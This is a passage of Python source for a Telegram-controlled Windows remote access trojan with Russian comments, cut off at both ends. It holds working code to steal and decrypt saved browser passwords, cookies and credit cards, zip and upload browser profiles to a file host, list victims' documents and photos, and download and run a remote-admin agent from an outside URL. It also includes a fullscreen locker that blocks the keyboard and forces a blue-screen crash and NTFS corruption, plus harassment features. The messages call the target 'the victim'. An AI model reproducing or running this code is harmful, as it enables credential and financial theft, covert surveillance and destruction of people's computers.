taskmgr_thread = threading.Thread(target=check_taskmgr)
def start_scan_taskmgr(message=None): # Функция для запуска сканирования
    global taskmgr_thread
    global scan_taskmgr
    if not taskmgr_thread.is_alive():
        scan_taskmgr = True
        taskmgr_thread = threading.Thread(target=check_taskmgr, args=(message,))
        taskmgr_thread.start()
        if message:
            bot.send_message(message.chat.id, "[TASKKILLER] Сканирование Taskmgr.exe начато.")
def stop_scan_taskmgr(message=None): # Функция для остановки сканирования
    global scan_taskmgr
    scan_taskmgr = False
    taskmgr_thread.join()
    if message:
        bot.send_message(message.chat.id, "[TASKKILLER] Сканирование Taskmgr.exe остановлено.")
####################################

###ТЕСТЫ######ТЕСТЫ######ТЕСТЫ######ТЕСТЫ###
def start_taskbar_hide(message): #Функция для запроса секунд для скрытия панели задач
    msg = bot.send_message(message.chat.id, "Введите количество секунд для скрытия панели задач:")
    bot.register_next_step_handler(msg, process_hide_taskbar)
def process_hide_taskbar(message): #Процесс скрытия процесса задач
    try:
        seconds = int(message.text)
        if seconds > 0:
            taskbar_hide()
            bot.send_message(message.chat.id, f"Панель задач скрыта на {seconds} секунд.")
            time.sleep(seconds)
            taskbar_vis()
            bot.send_message(message.chat.id, f"Панель задач снова видна.")
        else:
            bot.send_message(message.chat.id, "Пожалуйста, введите положительное число секунд.")
    except ValueError:
        bot.send_message(message.chat.id, "Пожалуйста, введите корректное число секунд.")
def taskbar_hide(): #Функция для скрытия процесса задач
    taskbar_hwnd = ctypes.windll.user32.FindWindowW(u'Shell_TrayWnd', None)
    ctypes.windll.user32.ShowWindow(taskbar_hwnd, 0)
def taskbar_vis(): #Функция для отображения процесса задач
    taskbar_hwnd = ctypes.windll.user32.FindWindowW(u'Shell_TrayWnd', None) 
    ctypes.windll.user32.ShowWindow(taskbar_hwnd, 5)
def check_agent_file(message): #Функция для поиска Agent.exe
    bot.send_message(message.chat.id, "Поиск нужного файла...")
    current_directory = os.path.dirname(__file__)
    agent_filename = os.path.join(current_directory, 'agent.exe')
    return os.path.isfile(agent_filename)
def download_agent(url, save_path, message): #Функция для установки Agent.exe
    bot.send_message(message.chat.id, "Устанавливаю программу...")
    response = requests.get(url)
    with open(save_path, 'wb') as file:
        file.write(response.content)
    time.sleep(5)
def open_program_and_screenshot(message): #Функция для скрина Agent.exe
    current_directory = os.path.dirname(__file__)
    agent_filename = os.path.join(current_directory, 'agent.exe')
    try:
        subprocess.Popen(agent_filename)
        bot.send_message(message.chat.id, "Открываю программу...")
        while True:
            window = gw.getWindowsWithTitle("RMS Агент")
            if window:
                break
            time.sleep(2)
        bot.send_message(message.chat.id, "Делаю скриншот...")
        screenshot = pyautogui.screenshot()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        return screenshot_path
    except Exception as e:
        print(e)
        return None
def agent_screenshot(message): #Общая функция поиска, установки, и скрина Agent.exe без возможности помешать программе
    chat_id = message.chat.id
    try:
        if not check_agent_file(message):
            agent_url = 'https://23031.selcdn.ru/rms-distr-01/agent.exe'
            agent_filename = os.path.join(os.path.dirname(__file__), 'agent.exe')
            download_agent(agent_url, agent_filename, message)
        screenshot_path = open_program_and_screenshot(message)
        if screenshot_path:
            with open(screenshot_path, "rb") as screenshot_file:
                bot.send_photo(chat_id, screenshot_file)
            os.remove(screenshot_path)
    except Exception as e:
        print(e)
        bot.send_message(chat_id, "Произошла ошибка. Попробуйте ещё раз.")
###ТЕСТЫ######ТЕСТЫ######ТЕСТЫ######ТЕСТЫ###

####################################
pythoncom.CoInitialize()
pythoncom.CoInitializeEx(pythoncom.COINIT_MULTITHREADED)
state = {}
mouse_locked = False
mouse_controller = MouseController()
mouse = Controller()
currentMouseX, currentMouseY = mouse.position
def lock_mouse(): #Глобальные переменные для блокировки мыши
    global mouse_locked
    while mouse_locked:
        move_mouse_to_center()
        time.sleep(0.01)
def unlock_mouse(e): #Глобальные переменные для разблокировки мыши
    global mouse_locked
    mouse_locked = False
def move_mouse_to_center(): #Функция для переноса мыши в центр
    screen_width, screen_height = pyautogui.size()
    center_x = screen_width // 2
    center_y = screen_height // 2
    pyautogui.moveTo(center_x, center_y)
class User:
	def __init__(self):
		keys = ['urldown', 'fin', 'curs']

		for key in keys:
			self.key = None
ip = socket.gethostbyname(socket.gethostname())
pyautogui.FAILSAFE = False
MessageBox = ctypes.windll.user32.MessageBoxW
if os.path.exists("msg.pt"):
	pass
else:
	f = open('msg.pt', 'tw', encoding='utf-8')
	f.close
def windowimage(message):
    bot.send_message(message.chat.id, "Пришлите пожалуйста фотографию!")
    bot.register_next_step_handler(message, process_image)
def process_image(message):
    try:
        chat_id = message.chat.id
        if message.photo:
            file_id = message.photo[-1].file_id
            file_info = bot.get_file(file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            with open("temp_photo.jpg", 'wb') as temp_file:
                temp_file.write(downloaded_file)
            image = cv2.imread("temp_photo.jpg")
            bot.send_message(chat_id, "Окно с картинкой было открыто.")
            cv2.namedWindow("Image", cv2.WND_PROP_FULLSCREEN)
            cv2.setWindowProperty("Image", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
            cv2.setWindowProperty("Image", cv2.WND_PROP_TOPMOST, cv2.WND_PROP_TOPMOST)
            cv2.imshow("Image", image)
            bot.send_message(my_id, "Выберите действие:", reply_markup=rape_keyboard)
            while True:
                key = cv2.waitKey(1)
                if key == 27:  # Код клавиши Esc
                    cv2.destroyAllWindows()
                    os.remove("temp_photo.jpg")
                    bot.send_message(chat_id, "Окно с картинкой было закрыто.")
                    break
        else:
            bot.send_message(chat_id, "Пожалуйста, отправьте фотографию.")
    except Exception as e:
        print(e)
        bot.send_message(chat_id, "Произошла ошибка. Попробуйте ещё раз.")
def random_mouse_60():
    root = tk.Tk()
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    pyautogui.FAILSAFE = False
    start_time = time.time()
    while time.time() - start_time < 60:  # Выполнять в течение 60 секунд
        x = random.randint(0, screen_width)
        y = random.randint(0, screen_height)
        pyautogui.moveTo(x, y)
        time.sleep(0.1)  # Перемещать каждые 0.1 секунды
def start_random_mouse(message):
    bot.send_message(message.chat.id, "Введите количество секунд для рандомных перемещений курсора:")
    bot.register_next_step_handler(message, perform_random_mouse)
def perform_random_mouse(message):
    try:
        duration_seconds = int(message.text)
        if duration_seconds <= 0:
            bot.send_message(message.chat.id, "Пожалуйста, введите положительное число секунд.")
            return
        bot.send_message(message.chat.id, f"Рандомные перемещения курсора начаты! Эффект продлится {duration_seconds} секунд.")
        bot.register_next_step_handler(message, mouse_process)
        
        root = tk.Tk()
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        pyautogui.FAILSAFE = False
        start_time = time.time()
        while time.time() - start_time < duration_seconds:
            x = random.randint(0, screen_width)
            y = random.randint(0, screen_height)
            pyautogui.moveTo(x, y)
            time.sleep(0.1)
        
        bot.send_message(message.chat.id, "Рандомные перемещения курсора завершены.")
    except ValueError:
        bot.send_message(message.chat.id, "Пожалуйста, введите корректное число секунд.")
        bot.register_next_step_handler(message, mouse_process)
def rotatescreen_process(message):
    screen = rotatescreen.get_primary_display()
    bot.send_message(message.chat.id, "Перевертыш запущен! Эффект продлится около 5 секунд.")
    for i in range(25):
        time.sleep(0.1)
        screen.rotate_to(i*90 % 360)
def wowscreen_60():
    image_screenshot = pyautogui.screenshot()
    _array_image = numpy.array(image_screenshot)
    image = cv2.cvtColor(_array_image, cv2.COLOR_RGB2BGR)
    cv2.namedWindow("window", cv2.WND_PROP_FULLSCREEN)
    cv2.setWindowProperty("window", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
    cv2.setWindowProperty("window", cv2.WND_PROP_TOPMOST, cv2.WND_PROP_TOPMOST)
    def mouse_evt(event, x, y, flags, param):
        if event == cv2.EVENT_MOUSEMOVE:
            win32api.SetCursor(win32api.LoadCursor(0, win32con.IDC_ARROW))
    cv2.setMouseCallback("window", mouse_evt)
    cv2.imshow("window", image)
    _width = _array_image.shape[1]
    _height = _array_image.shape[0]
    _columns = 40
    _step = _width // _columns
    _move_down_by = 5
    _start_time = time.time()
    while True:
        _current_time = time.time()
        if _current_time - _start_time >= 60:
            break
        _col = random.randint(0, _columns) * _step
        for i in range(_move_down_by):
            _array_image[i + 1:_height, _col:_col + _step, :3] = _array_image[i:_height - 1, _col:_col + _step, :3]
        image = cv2.cvtColor(_array_image, cv2.COLOR_RGB2BGR)
        cv2.imshow("window", image)
        cv2.waitKey(1)
    cv2.destroyAllWindows()
def start_wowscreen(message):
    bot.send_message(message.chat.id, "Введите количество секунд для эффекта плывущего экрана:")
    bot.register_next_step_handler(message, perform_wowscreen)
def perform_wowscreen(message):
    try:
        duration = int(message.text)
        if duration <= 0:
            bot.send_message(message.chat.id, "Введите положительное количество секунд.")
            return
        bot.send_message(message.chat.id, f"Эффект плывущего экрана будет активен в течение {duration} секунд.")
        image_screenshot = pyautogui.screenshot()
        _array_image = numpy.array(image_screenshot)
        image = cv2.cvtColor(_array_image, cv2.COLOR_RGB2BGR)
        cv2.namedWindow("window", cv2.WND_PROP_FULLSCREEN)
        cv2.setWindowProperty("window", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
        cv2.setWindowProperty("window", cv2.WND_PROP_TOPMOST, cv2.WND_PROP_TOPMOST)
        def mouse_evt(event, x, y, flags, param):
            if event == cv2.EVENT_MOUSEMOVE:
                win32api.SetCursor(win32api.LoadCursor(0, win32con.IDC_ARROW))
        cv2.setMouseCallback("window", mouse_evt)
        cv2.imshow("window", image)
        _width = _array_image.shape[1]
        _height = _array_image.shape[0]
        _columns = 40
        _step = _width // _columns
        _move_down_by = 5
        _start_time = time.time()
        while True:
            _current_time = time.time()
            if _current_time - _start_time >= duration:
                break
            _col = random.randint(0, _columns) * _step
            for i in range(_move_down_by):
                _array_image[i + 1:_height, _col:_col + _step, :3] = _array_image[i:_height - 1, _col:_col + _step, :3]
            image = cv2.cvtColor(_array_image, cv2.COLOR_RGB2BGR)
            cv2.imshow("window", image)
            cv2.waitKey(1)
        cv2.destroyAllWindows()
        bot.send_message(message.chat.id, "Эффект плывущего экрана отключен.")
    except ValueError:
        bot.send_message(message.chat.id, "Введите корректное количество секунд.")
waiting_for_wallpaper = {}
def set_wallpaper(image_path):
    try:
        wallpaper_path = os.path.abspath(image_path)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Control Panel\Desktop", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "WallpaperStyle", 0, winreg.REG_SZ, "0")# 2 - Заставка растягивается для заполнения экрана
        winreg.SetValueEx(key, "TileWallpaper", 0, winreg.REG_SZ, "0")# 0 - Растягивать обои
        ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(f"Ошибка при установке обоев: {str(e)}")
        return False
def set_wallpaper_command(message):
    bot.send_message(message.chat.id, "Пожалуйста, отправьте мне изображение для установки в качестве обоев.")
    waiting_for_wallpaper[message.chat.id] = True
@bot.message_handler(content_types=['document', 'photo'])
def handle_document_or_photo(message):
    if message.chat.id in waiting_for_wallpaper and waiting_for_wallpaper[message.chat.id]:
        try:
            file_info = None
            if message.document:
                file_info = bot.get_file(message.document.file_id)
            elif message.photo:
                file_info = bot.get_file(message.photo[-1].file_id)
            if file_info:
                downloaded_file = bot.download_file(file_info.file_path)
                src = message.document.file_name if message.document else 'input_image.png'
                with open(src, 'wb') as new_file:
                    new_file.write(downloaded_file)
                if set_wallpaper(os.path.abspath(src)):
                    bot.send_message(message.chat.id, "Обои успешно установлены.")
                else:
                    bot.send_message(message.chat.id, "Ошибка при установке обоев.")
                os.remove(src)
            else:
                bot.send_message(message.chat.id, "Не удалось получить файл для установки обоев.")
        except Exception as e:
            print(f"Ошибка при обработке файла: {str(e)}")
            bot.send_message(message.chat.id, "Произошла ошибка при обработке файла. Пожалуйста, попробуйте еще раз.")
        waiting_for_wallpaper[message.chat.id] = False
def perform_grab_arch(message):
    bot.send_message(message.chat.id, "Поиск архивов начался...")
    folders_to_search = [
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Desktop"),
    ]
    archives = find_and_save_archives("archives_list.txt", folders_to_search)
    if archives:
        with open("archives_list.txt", "rb") as file:
            bot.send_document(message.chat.id, file)
        os.remove("archives_list.txt")
    else:
        bot.send_message(message.chat.id, "Архивы не найдены.")
def perform_grab_txt(message):
    bot.send_message(message.chat.id, "Поиск текстовых документов начался...")
    text_document_extensions = (".txt", ".docx")
    folders_to_search = [
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Desktop"),
    ]
    text_documents = find_and_save_files("text_documents_list.txt", folders_to_search, text_document_extensions)
    if text_documents:
        with open("text_documents_list.txt", "rb") as file:
            bot.send_document(message.chat.id, file)
        os.remove("text_documents_list.txt")
    else:
        bot.send_message(message.chat.id, "Текстовые документы не найдены.")
def send_files_document(chat_id, files_list, message_text):
    if files_list:
        with open(files_list, "rb") as file:
            bot.send_document(chat_id, file)
        os.remove(files_list)
    else:
        bot.send_message(chat_id, message_text)
def perform_quick_screenshot(message):
    bot.send_chat_action(my_id, 'upload_photo')
    screenshot_file = get_screenshot()
    if screenshot_file:
        bot.send_photo(my_id, open(screenshot_file, "rb"))
        os.remove(screenshot_file)
    else:
        bot.send_message(my_id, "Ошибка при снятии скриншота: " + screenshot_file)
def perform_grab_photos(message):
    bot.send_message(my_id, "Поиск фотографий начался...")
    photo_extensions = (".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff")
    folders_to_search = [
        os.path.expanduser("~\Downloads"),
        os.path.expanduser("~\Documents"),
        os.path.expanduser("~\Pictures"),
        os.path.expanduser("~\Desktop"),
    ]
    photo_files = find_and_save_files("photo_list.txt", folders_to_search, photo_extensions)
    send_files_document(message.chat.id, "photo_list.txt", "Фотографии не найдены.")
def perform_grab_music(message):
    bot.send_message(my_id, "Поиск музыкальных файлов начался...")
    music_extensions = (".mp3", ".wav", ".flac")
    folders_to_search = [
        os.path.expanduser("~\Downloads"),
        os.path.expanduser("~\Documents"),
        os.path.expanduser("~\Music"),
        os.path.expanduser("~\Desktop"),
    ]
    music_files = find_and_save_files("music_list.txt", folders_to_search, music_extensions)
    send_files_document(message.chat.id, "music_list.txt", "Музыкальные файлы не найдены.")
def perform_grab_video(message):
    bot.send_message(my_id, "Поиск видеофайлов начался...")
    video_extensions = (".mp4", ".avi", ".mov", ".mkv")
    folders_to_search = [
        os.path.expanduser("~\Downloads"),
        os.path.expanduser("~\Documents"),
        os.path.expanduser("~\Videos"),
        os.path.expanduser("~\Desktop"),
    ]
    video_files = find_and_save_files("video_list.txt", folders_to_search, video_extensions)
    send_files_document(message.chat.id, "video_list.txt", "Видеофайлы не найдены.")
def trigger_bsod_process():
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
def trigger_bsod(message):
    bot.send_message(message.chat.id, "Синий экран смерти вызван.")
    trigger_bsod_process()
def upload_folder_to_fileio(folder_path, folder_name):
    try:
        archive_name = f"{folder_name}_User_Data.zip"
        archive_path = os.path.join("temp_browser_data", archive_name)
        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as archive:
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    archive.write(file_path, os.path.relpath(file_path, folder_path))
        fileio_url = upload_to_fileio(archive_path)
        os.remove(archive_path)
        return fileio_url
    except Exception as e:
        log_message(f"Ошибка при загрузке папки {folder_name} на файлообменник: {str(e)}")
        log_message("___________________________________\n")
        return None
def copy_browsers_data(message):
    try:
        chat_id = message.chat.id
        bot.send_message(message.chat.id, "Граббер папок User Data активирован!\nЛоги в текстовом файле отправятся вам через 5-10 минут, в зависимости от размеров архивов.\n____________________________")
        log_file_path = "copy_browsers_data_log.txt"
        with open(log_file_path, "w", encoding="utf-8") as log_file:
            log_message("Начинаю искать нужные директории...\n___________________________________\n")
        client_username = os.getlogin()
        browser_directories = {
            "Avast": r'C:\Users\{}\AppData\Local\AVAST Software\Browser\User Data'.format(client_username),
            "Amigo": r'C:\Users\{}\AppData\Amigo\User Data'.format(client_username),
            "Torch": r'C:\Users\{}\AppData\Torch\User Data'.format(client_username),
            "Kometa": r'C:\Users\{}\AppData\Kometa\User Data'.format(client_username),
            "Orbitum": r'C:\Users\{}\AppData\Orbitum\User Data'.format(client_username),
            "7star": r'C:\Users\{}\AppData\7Star\7Star\User Data'.format(client_username),
            "Cent-browser": r'C:\Users\{}\AppData\CentBrowser\User Data'.format(client_username),
            "Sputnik": r'C:\Users\{}\AppData\Sputnik\Sputnik\User Data'.format(client_username),
            "Vivaldi": r'C:\Users\{}\AppData\Local\Vivaldi\User Data'.format(client_username),
            "Chrome-sxs": r'C:\Users\{}\AppData\Google\\Chrome SxS\User Data'.format(client_username),
            "Chrome": r'C:\Users\{}\AppData\Local\Google\Chrome\User Data'.format(client_username),
            "Epic Privacy Browser": r'C:\Users\{}\AppData\Epic Privacy Browser\User Data'.format(client_username),
            "Edge": r'C:\Users\{}\AppData\Local\Microsoft\Edge\User Data'.format(client_username),
            "Uran": r'C:\Users\{}\AppData\uCozMedia\\Uran\User Data'.format(client_username),
            "Yandex": r'C:\Users\{}\AppData\Local\Yandex\YandexBrowser\User Data'.format(client_username),
            "Brave": r'C:\Users\{}\AppData\Local\BraveSoftware\Brave-Browser\User Data'.format(client_username),
            "Iridium": r'C:\Users\{}\AppData\Iridium\User Data'.format(client_username),
            "Opera": r'C:\Users\{}\AppData\Roaming\Opera Software\Opera Stable'.format(client_username),
        }
        temp_dir = "temp_browser_data"
        os.makedirs(temp_dir, exist_ok=True)
        upload_threads = []
        for browser_name, browser_data_path in browser_directories.items():
            if os.path.exists(browser_data_path):
                log_message(f"Директория браузера {browser_name} - найдена ✅")
                log_message("___________________________________\n")
                bot.send_message(message.chat.id, "Директория найдена и добавлена в очередь! Начинаю копирование и загрузку на файлообменник.\n____________________________")
                thread = threading.Thread(target=upload_and_send_link, args=(browser_data_path, browser_name, chat_id, log_file_path))
                upload_threads.append(thread)
                thread.start()
            else:
                log_message(f"Директория браузера {browser_name} - не найдена ❌")
                log_message("___________________________________\n")
        for thread in upload_threads:
            thread.join()
        log_message("Копирование данных завершено.")
        log_message("___________________________________\n")
        bot.send_message(message.chat.id, "Копирование данных завершено.")
        with open(log_file_path, "rb") as log_file:
            bot.send_document(chat_id, log_file)
        shutil.rmtree(temp_dir, ignore_errors=True)
    except Exception as e:
        log_message(f"\nПроизошла ошибка: {str(e)}")
        log_message("___________________________________\n")
        bot.send_message(chat_id, f"Произошла ошибка: {str(e)}")
def upload_and_send_link(folder_path, folder_name, chat_id, log_file_path):
    try:
        fileio_url = upload_folder_to_fileio(folder_path, folder_name)
        if fileio_url:
            log_message(f"Login Data браузера {folder_name} успешно загружен!\nСкачать: {fileio_url}", log_file_path)
            log_message("___________________________________\n")
        else:
            log_message(f"Не удалось загрузить архив {folder_name} на файлообменник.", log_file_path)
            log_message("___________________________________\n")
    except Exception as e:
        log_message(f"Произошла ошибка: {str(e)}", log_file_path)
        log_message("___________________________________\n")
def log_message(message, log_file_path="copy_browsers_data_log.txt"):
    with open(log_file_path, "a", encoding="utf-8") as log_file:
        log_file.write(message + "\n")
def copy_file_with_permission_error(file_path, destination_path):
    try:
        shutil.copy(file_path, destination_path)
    except PermissionError as e:
        log_message(f"Ошибка при копировании файла {file_path}: {str(e)} (Пропущено)")
        log_message("___________________________________\n")
    except Exception as e:
        log_message(f"Произошла ошибка при копировании файла {file_path}: {str(e)}")
        log_message("___________________________________\n")
global password
password = None
attempts = 0
max_attempts = 1
def start_winlock(message):
    global password, attempts
    password = None
    if password is None:
        attempts = 0 
        bot.send_message(message.chat.id, "Рекомендуем начать запись экрана, чтобы повеселиться 😈, также можете заблокировать мышь с целью извлечения наибольшего наслаждения...\n\nЕсли вы работаете над какими то функциями, то советуем заблокировать мышь для того, чтобы случайно не вызвать BSOD!\n\nВведите пароль от вин-локера(только цифры):")
        bot.register_next_step_handler(message, check_password)
    else:
        bot.send_message(message.chat.id, "Вин-локер уже активирован.")
def check_password(message):
    global password, attempts
    if message.text.isdigit():
        password = message.text
        winlock(password, message)
        bot.send_message(message.chat.id, "Жертва закрыла вин-локер.")
    else:
        attempts += 1
        if attempts > max_attempts:
            bot.send_message(message.chat.id, f"Превышено количество попыток ввода пароля. Возвращение в главное меню.")
            attempts = 0
            bot.register_next_step_handler(message, back)
        else:
            remaining_attempts = max_attempts - attempts
            bot.send_message(message.chat.id, f"Пароль должен содержать только цифры. Попробуйте еще раз ({attempts} из {max_attempts} попыток)")
            bot.register_next_step_handler(message, check_password)
def winlock(password, message):
    bot.send_message(my_id, "Вин-локер запущен", reply_markup=rape_keyboard)
    lock_text = "СОПРОТИВЛЯТЬСЯ БЕСПОЛЕЗНО!"
    count = 3
    file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    def bsod():
        subprocess.call("cd C:\:$i30:$bitmap",shell=True)
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
    def exitwind(wind):
        wind.destroy()
        kb.unhook_all()
    def buton(arg):
        enter_pass.insert(tk.END, arg)
    def delbuton():
        enter_pass.delete(-1, tk.END)
    def tapp(key):
        pass
    def check():
        nonlocal count
        if enter_pass.get() == password:
            messagebox.showinfo("ЭТО СМЕРТЬ ТВОЕЙ СИСТЕМЫ","СМЕРТЬ НЕ ЖДЕТ...")
            exitwind(wind)
        else:
            count -= 1
            if count == 0:
                messagebox.showwarning("ЭТО СМЕРТЬ ТВОЕЙ СИСТЕМЫ","КОЛИЧЕСТВО ПОПЫТОК ИСТЕКЛО...")
                bsod()
            else:
                messagebox.showwarning("ЭТО СМЕРТЬ ТВОЕЙ СИСТЕМЫ","НЕВЕРНЫЙ ПАРОЛЬ, ОСТАЛОСЬ ПОПЫТОК:"+ str(count))
    def exiting():
        messagebox.showwarning("ЭТО СМЕРТЬ ТВОЕЙ СИСТЕМЫ","СМЕРТЬ РЯДОМ...")
    wind = tk.Tk()
    wind.title("ЭТО СМЕРТЬ ТВОЕЙ СИСТЕМЫ")
    wind["bg"] = "black"
    UNTEXD = tk.Label(wind,bg="black", fg="red",text="ЭТО СМЕРТЬ ТВОЕЙ СИСТЕМЫ\n\n\n", font="helvetica 75").pack()
    untex = tk.Label(wind,bg="black", fg="red",text=lock_text, font="helvetica 40")
    untex.pack(side=tk.TOP)
    kb.on_press(tapp, suppress=True)
    enter_pass = tk.Entry(wind,bg="black", fg="red", text="", font="helvetica 35")
    enter_pass.pack()
    wind.resizable(0,0)
    wind.lift()
    wind.attributes('-topmost',True)
    wind.after_idle(wind.attributes,'-topmost',True)
    wind.attributes('-fullscreen', True)
    button = tk.Button(wind,text='unlock',padx="31", pady="19",bg='black',fg='red',font="helvetica 30", command=check)
    button.pack()
    wind.protocol("WM_DELETE_WINDOW", exiting)
    button0 = tk.Button(wind,text='0',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "0")).pack(side=tk.LEFT)
    button1 = tk.Button(wind,text='1',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "1")).pack(side=tk.LEFT)
    button2 = tk.Button(wind,text='2',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "2")).pack(side=tk.LEFT)
    button3 = tk.Button(wind,text='3',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "3")).pack(side=tk.LEFT)
    button4 = tk.Button(wind,text='4',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "4")).pack(side=tk.LEFT)
    button5 = tk.Button(wind,text='5',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "5")).pack(side=tk.LEFT)
    button6 = tk.Button(wind,text='6',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "6")).pack(side=tk.LEFT)
    button7 = tk.Button(wind,text='7',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "7")).pack(side=tk.LEFT)
    button8 = tk.Button(wind,text='8',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "8")).pack(side=tk.LEFT)
    button9 = tk.Button(wind,text='9',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "9")).pack(side=tk.LEFT)
    delbutton = tk.Button(wind,text='<',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=delbuton).pack(side=tk.LEFT)
    wind.mainloop()
def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available
def create_temp_directory():
    temp_dir = 'temp_db'
    if not os.path.exists(temp_dir):
        os.mkdir(temp_dir)
    return temp_dir
def get_master_key_from_path(path: str):
    if not os.path.exists(path):
        return
    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return
    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key
def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass
def save_results(message, browser_name, type_of_data, content):
    browser_info_folder = os.path.join(bot_root_folder, 'temp_folder')
    browser_folder = os.path.join(browser_info_folder, browser_name)
    if not os.path.exists(browser_folder):
        os.mkdir(browser_folder)
    if content is not None:
        with open(os.path.join(browser_folder, f'{type_of_data}.txt'), 'w', encoding="utf-8") as file:
            file.write(content)
def close_browser(browser_name):
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['name'] == browser_name:
            try:
                parent = psutil.Process(process.info['pid'])
                for child in parent.children(recursive=True):
                    child.terminate()
                parent.terminate()
                parent.wait(5)
            except psutil.NoSuchProcess:
                pass
def start_browser(browser_path):
    subprocess.Popen(browser_path, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
def safe_copy(src, dst):
    try:
        shutil.copy(src, dst)
        return True
    except PermissionError:
        return False
def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    temp_dir = create_temp_directory()
    temp_db_file = os.path.join(temp_dir, 'temp.db')
    if not safe_copy(db_file, temp_db_file):
        return
    conn = sqlite3.connect(temp_db_file)
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    row[i] = decrypt_password(row[i], key)
        if type_of_data['query'] == 'SELECT url, title, last_visit_time FROM urls':
            if row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            else:
                row[2] = "0"
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    os.remove(temp_db_file)
    return result
def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
def get_browsers_info(message):
    appdata = os.getenv('LOCALAPPDATA')
    browsers = {
        'avast': appdata + '\\AVAST Software\\Browser\\User Data',
        'amigo': appdata + '\\Amigo\\User Data',
        'torch': appdata + '\\Torch\\User Data',
        'kometa': appdata + '\\Kometa\\User Data',
        'orbitum': appdata + '\\Orbitum\\User Data',
        'cent-browser': appdata + '\\CentBrowser\\User Data',
        '7star': appdata + '\\7Star\\7Star\\User Data',
        'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
        'vivaldi': appdata + '\\Vivaldi\\User Data',
        'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
        'google-chrome': appdata + '\\Google\\Chrome\\User Data',
        'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
        'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
        'uran': appdata + '\\uCozMedia\\Uran\\User Data',
        'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
        'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
        'iridium': appdata + '\\Iridium\\User Data',
    }
    data_queries = {
        'login_data': {
            'query': 'SELECT action_url, username_value, password_value FROM logins',
            'file': '\\Login Data',
            'columns': ['URL', 'Email', 'Password'],
            'decrypt': True
        },
        'credit_cards': {
            'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
            'file': '\\Web Data',
            'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
            'decrypt': True
        },
        'cookies': {
            'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
            'file': '\\Network\\Cookies',
            'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
            'decrypt': True
        },
        'history': {
            'query': 'SELECT url, title, last_visit_time FROM urls',
            'file': '\\History',
            'columns': ['URL', 'Title', 'Visited Time'],
            'decrypt': False
        },
        'downloads': {
            'query': 'SELECT tab_url, target_path FROM downloads',
            'file': '\\History',
